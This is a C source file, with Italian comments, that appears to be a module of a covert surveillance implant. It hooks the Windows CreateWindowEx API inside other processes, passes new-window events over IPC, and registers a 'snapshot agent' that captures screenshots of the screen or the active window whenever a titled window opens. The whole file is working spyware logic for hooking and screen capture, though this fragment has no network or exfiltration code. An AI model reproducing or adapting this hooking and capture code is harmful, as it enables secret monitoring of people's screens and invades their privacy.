extern BOOL g_newwindow_created;

typedef struct _snap_param_struct {
	DWORD interval;
	DWORD tag;
	BOOL only_window;
	BOOL on_new_window;
} snap_param_struct;

#define SNAP_IMG_QUALITY_LOW 0;
#define SNAP_IMG_QUALITY_MED 50;
#define SNAP_IMG_QUALITY_HI 100;

BOOL capture_only_window = FALSE;
DWORD image_quality = SNAP_IMG_QUALITY_MED;

// Hook per la notifica di creazione di nuove finestre
typedef struct {
	COMMONDATA;
} CreateWindowExStruct;
CreateWindowExStruct CreateWindowExData;

HWND __stdcall PM_CreateWindowEx(DWORD dwExStyle,
								 LPCTSTR lpClassName,
								 LPCTSTR lpWindowName,
								 DWORD dwStyle,
								 int x,
								 int y,
								 int nWidth,
								 int nHeight,
								 HWND hWndParent,
								 HMENU hMenu,
								 HINSTANCE hInstance,
								 LPVOID lpParam) 
{
	BOOL *Active;

	MARK_HOOK
	INIT_WRAPPER(CreateWindowExStruct)
	CALL_ORIGINAL_API(12)

	Active = (BOOL *)pData->pHM_IpcCliRead(PM_ONNEWWINDOW_IPC);
	// Controlla se il monitor e' attivo e se la funzione e' andata a buon fine
	if (!Active || !(*Active) || !ret_code)
		return (HWND)ret_code;

	if ( (dwStyle&WS_CAPTION)==WS_CAPTION || (dwStyle&WS_EX_MDICHILD)==WS_EX_MDICHILD)
		pData->pHM_IpcCliWrite(PM_ONNEWWINDOW_IPC, (BYTE *)&ret_code, 4, dwStyle, IPC_DEF_PRIORITY);
			
	return (HWND)ret_code;
}

DWORD PM_CreateWindowEx_setup(HMServiceStruct *pData)
{
	CreateWindowExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
	CreateWindowExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
	CreateWindowExData.dwHookLen = 256;
	return 0;
}

// In realta' serve per l'evento on_new_window ma deve essere un dispatcher quindi l'ho lasciato qui
// per motivi "storici"...lo so fa cagare...
DWORD __stdcall PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
{
	char buff[1024];

	buff[0] = NULL;
	HM_SafeGetWindowTextA(*(HWND*)msg, buff, sizeof(buff));
	if (buff[0])  // Solo se ha il titolo
		g_newwindow_created = TRUE;
	return 1;
}

DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
{
	if (bStartFlag && bReset) 
		TakeSnapShot(NULL, capture_only_window, image_quality);
	return 1;
}


DWORD __stdcall PM_SnapShotInit(BYTE *conf_ptr, BOOL bStartFlag)
{
	snap_param_struct *snap_param = (snap_param_struct *)conf_ptr;

	if (snap_param) { 
		capture_only_window = snap_param->only_window;
		image_quality = SNAP_IMG_QUALITY_MED; // Dovra' prenderla dal file
	} else {
		capture_only_window = FALSE;
		image_quality = SNAP_IMG_QUALITY_MED;
	}
	PM_SnapShotStartStop(bStartFlag, TRUE);
	return 1;
}


void PM_SnapShotRegister()
{
	AM_MonitorRegister(PM_SNAPSHOTAGENT, (BYTE *)NULL, (BYTE *)PM_SnapShotStartStop, (BYTE *)PM_SnapShotInit, NULL);
	AM_MonitorRegister(PM_ONNEWWINDOW_IPC, (BYTE *)PM_NewWindowDispatch, (BYTE *)NULL, (BYTE *)NULL, NULL);
	PM_SnapShotInit(NULL, FALSE);
}